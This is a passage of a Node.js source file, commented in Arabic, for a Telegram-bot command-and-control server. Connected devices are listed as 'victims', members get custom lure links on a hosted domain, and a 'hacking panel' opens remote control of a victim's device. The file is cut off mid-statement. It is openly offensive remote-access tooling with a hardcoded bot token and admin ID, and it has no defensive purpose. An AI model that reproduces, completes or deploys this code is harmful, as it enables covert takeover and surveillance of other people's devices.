const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const uuid4 = require("uuid").v4;

// --- الإعدادات السيادية للمطور @A_l_k_w_r_y ---
const token = '8531140296:AAGGyJqPaVSiRWTEUbrG1fmEsfLHVWELV20';
const ADMIN_ID = 6568145373; 
const BASE_URL = "https://labeb.onrender.com"; 

const app = express();
const server = http.createServer(app);
const wss = new webSocket.Server({ server });
const bot = new telegramBot(token, { polling: true });

let clients = [];
let allowedUsers = [ADMIN_ID]; 
let userPaths = {}; // نظام المسارات المخصصة (الاستضافات)
let pendingRequests = new Set();

// --- نظام إدارة الطلبات والتحكم الذكي ---
bot.on("message", async (msg) => {
    const id = msg.chat.id;
    const text = msg.text;

    // 1. نظام الحماية ومنع الإزعاج
    if (!allowedUsers.includes(id)) {
        if (pendingRequests.has(id)) return; // يتجاهل الرسائل المكررة بصمت لسرعة السيرفر
        
        pendingRequests.add(id);
        bot.sendMessage(ADMIN_ID, `🔔 <b>طلب انضمام جديد للنظام:</b>\n👤 الاسم: ${msg.from.first_name}\n🆔 المعرف: <code>${id}</code>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[{ text: "✅ إعفاء وتفعيل فوري", callback_data: `allow_${id}` }]]
            }
        });
        return bot.sendMessage(id, "⏳ <b>وصولك معلق..</b>\nتم إرسال طلبك للإمبراطور @A_l_k_w_r_y للمراجعة.");
    }

    // 2. واجهة الإمبراطور (الأدمن فقط)
    if (id === ADMIN_ID && text === "/start") {
        return bot.sendMessage(id, `👑 <b>مرحباً بك في غرفة العمليات المركزية</b>\n\n📊 <b>الإحصائيات:</b>\n• الضحايا المتصلين: <code>${clients.length}</code>\n• الأعضاء النشطين: <code>${allowedUsers.length - 1}</code>`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ["📱 عرض كافة الضحايا", "👥 المصرح لهم"],
                    ["🔓 إعفاء مستخدم", "🚫 طرد مستخدم"],
                    ["📢 إذاعة عامة", "🔄 تحديث السيرفر"]
                ],
                resize_keyboard: true
            }
        });
    }

    // 3. واجهة المستخدم (توليد الرابط المستقل)
    if (text === "/start" && id !== ADMIN_ID) {
        const myPath = userPaths[id] || "اسم_مخصص";
        return bot.sendMessage(id, `💎 <b>أهلاً بك في نظام السيطرة الخاص بك</b>\n\n🔗 <b>رابط استضافتك الحالي:</b>\n<code>${BASE_URL}/${myPath}</code>\n\n⚙️ <i>اضغط على الزر أدناه لتخصيص رابطك.</i>`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [["📱 ضحاياي", "⚙️ تخصيص رابط الاستضافة"]],
                resize_keyboard: true
            }
        });
    }

    // تخصيص اسم الرابط (المسار)
    if (text === "⚙️ تخصيص رابط الاستضافة") {
        bot.sendMessage(id, "✍️ أرسل الآن الاسم الذي تريده لرابطك (مثلاً: king):");
        bot.once("message", (m) => {
            const cleanPath = m.text.replace(/[^a-zA-Z0-9]/g, "");
            userPaths[id] = cleanPath;
            bot.sendMessage(id, `✅ <b>تم اعتماد رابطك الجديد:</b>\n<code>${BASE_URL}/${cleanPath}</code>`, { parse_mode: 'HTML' });
        });
    }

    // تنفيذ الإعفاء والطرد (فوري وبدون أخطاء)
    if (id === ADMIN_ID && (text === "🔓 إعفاء مستخدم" || text === "🚫 طرد مستخدم")) {
        const isExempt = text.includes("إعفاء");
        bot.sendMessage(id, `✍️ أرسل معرف (ID) الشخص المراد ${isExempt ? "إعفاؤه" : "طرده"}:`);
        bot.once("message", (m) => {
            const target = parseInt(m.text);
            if (isExempt) {
                if (!allowedUsers.includes(target)) allowedUsers.push(target);
                bot.sendMessage(id, `✅ تم إعفاء العضو <code>${target}</code> بنجاح.`, {parse_mode: 'HTML'});
                bot.sendMessage(target, "✅ <b>مبارك! تم إعفاؤك وتفعيل حسابك.</b>\nأرسل /start الآن.");
            } else {
                allowedUsers = allowedUsers.filter(u => u !== target);
                bot.sendMessage(id, `✅ تم طرد العضو <code>${target}</code> فوراً.`, {parse_mode: 'HTML'});
            }
        });
    }

    // عرض الضحايا
    if (text === "📱 ضحاياي" || text === "📱 عرض كافة الضحايا") {
        const myVictims = (id === ADMIN_ID && text.includes("كافة")) ? clients : clients.filter(c => c.ownerId == id);
        if (myVictims.length === 0) return bot.sendMessage(id, "❌ لا توجد أجهزة متصلة حالياً.");
        
        myVictims.forEach(c => {
            bot.sendMessage(id, `👤 <b>جهاز ضحية:</b>\n🆔 المعرف: <code>${c.id}</code>`, {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🕹️ فتح لوحة السيطرة", callback_data: `control_${c.id}` }]] }
            });
        });
    }
});

// --- لوحة الاختراق الشفافة (Inline) ---
bot.on("callback_query", async (q) => {
    const [action, value] = q.data.split("_");

    if (action === "allow") {
        const target = parseInt(value);
        if (!allowedUsers.includes(target)) allowedUsers.push(target);
        pendingRequests.delete(target);
        bot.sendMessage(target, "✅ <b>تم إعفاؤك وتفعيل حسابك!</b>\nأرسل /start للحصول على رابطك.");
        return bot.answerCallbackQuery(q.id, { text: "تم التفعيل" });
    }

    if (action === "control") {
        const vId = value;
        const panel
